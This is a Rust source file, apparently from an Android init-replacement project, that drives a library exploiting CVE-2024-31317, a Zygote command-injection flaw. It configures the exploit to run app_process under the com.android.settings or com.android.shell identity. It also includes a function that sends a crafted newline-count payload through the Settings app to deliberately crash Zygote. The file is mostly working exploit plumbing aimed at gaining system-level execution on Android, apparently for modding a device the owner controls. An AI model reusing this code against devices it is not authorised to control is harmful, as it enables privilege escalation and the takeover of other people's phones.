use android_31317_exploit::{
    Cve31317Exploit, DEFAULT_TRAILING_NEWLINE_COUNT, ExploitKind, TriggerApp,
};
use pinitd_common::android::fetch_package_path;
use tokio::time::timeout;

use crate::error::{Error, Result};
use std::{sync::OnceLock, time::Duration};

static SHARED_EXPLOIT: OnceLock<Cve31317Exploit> = OnceLock::new();

pub async fn init_exploit(use_system_domain: bool) -> Result<()> {
    let path = timeout(Duration::from_secs(2), async move {
        fetch_package_path("com.penumbraos.pinitd").await
    })
    .await??;

    let calling_package = if use_system_domain {
        "com.android.settings"
    } else {
        "com.android.shell"
    };

    let args = vec![
        "-cp".into(),
        path,
        "/system/bin".into(),
        "--application".into(),
        "com.penumbraos.pinitd.SettingWriter".into(),
        calling_package.into(),
    ];

    info!("Setting {args:?}");

    let exploit =
        Cve31317Exploit::new_with_command("/system/bin/app_process".into(), args.clone(), args);
    let _ = SHARED_EXPLOIT.set(exploit);

    Ok(())
}

pub fn exploit() -> Result<&'static Cve31317Exploit> {
    SHARED_EXPLOIT
        .get()
        .ok_or_else(|| Error::Unknown("Unexpected access to uninitialized SHARED_EXPLOIT".into()))
}

/// Purposefully crash Zygote after reparenting cgroups to mitigate Zygote vulnerability (see #4 for more information)
pub async fn trigger_exploit_crash() -> Result<()> {
    let exploit = exploit()?;
    // Settings don't matter since this process will die when Zygote does
    exploit
        .new_launch_payload_with_newline_count(
            DEFAULT_TRAILING_NEWLINE_COUNT,
            // Way more lines than we will be providing
            Some(DEFAULT_TRAILING_NEWLINE_COUNT + 100),
            1000,
            None,
            None,
            "/data/",
            "com.android.settings",
            "platform:system_app:targetSdkVersion=29:complete",
            &ExploitKind::Command(format!("echo \"dying\"")),
            None,
        )?
        .execute(
            &TriggerApp::new(
                "com.android.settings".into(),
                "com.android.settings.Settings".into(),
            ),
            // Don't wait for logcat after spawn
            false,
            true,
        )
        .await?;

    Ok(())
}
